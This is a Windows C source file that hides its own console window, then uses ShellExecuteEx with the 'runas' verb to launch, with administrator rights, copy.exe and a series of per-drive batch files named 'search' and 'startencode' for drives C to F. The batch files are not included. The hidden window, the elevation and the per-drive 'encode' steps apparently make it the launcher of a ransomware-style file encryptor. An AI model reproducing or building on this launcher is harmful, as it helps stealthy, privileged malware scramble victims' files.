#include <stdio.h>
#include<windows.h>
#include<tchar.h>
#include<stdlib.h>
/*int repeat(void){
	SHELLEXECUTEINFO sei={sizeof(SHELLEXECUTEINFO)};
	sei.lpVerb=TEXT("runas");
	sei.lpFile=TEXT("shellexecuteextra.exe");//add  application  which you want to run as administrator here
	sei.nShow=SW_SHOWNORMAL;//without this,the windows will be hiden
	if(!ShellExecuteEx(&sei)){
	DWORD dwStatus=GetLastError();
	if(dwStatus==ERROR_CANCELLED){
	printf("提升权限被用户拒绝\n");
	}
	else 
	if(dwStatus==ERROR_FILE_NOT_FOUND){
	printf("所要执行的文件没有找到\n");
	}
	}
}*/
void execute(char name[]){
	SHELLEXECUTEINFO sei={sizeof(SHELLEXECUTEINFO)};
	sei.lpVerb=TEXT("runas");
	sei.lpFile=TEXT(name);//add  application  which you want to run as administrator here
	//sei.nShow=SW_SHOWNORMAL;//without this,the windows will be hiden
	if(!ShellExecuteEx(&sei)){
	DWORD dwStatus=GetLastError();
	if(dwStatus==ERROR_CANCELLED){
	printf("提升权限被用户拒绝\n");
	}
	else 
	if(dwStatus==ERROR_FILE_NOT_FOUND){
	printf("所要执行的文件没有找到\n");
	}
	}
	
	}
int _tmain(int argc,TCHAR* argv[])
{	
	ShowWindow(FindWindow("ConsoleWindowClass",argv[0]),0);
	execute("copy.exe");
	execute("searchd.bat");
	execute("searche.bat");
	execute("searchf.bat");
	Sleep(100);
	execute("startencoded.bat");
	execute("startencodee.bat");
	execute("startencodef.bat");
	execute("searchc.bat");
	execute("startencodec.bat");
	
	
	return 0;
}
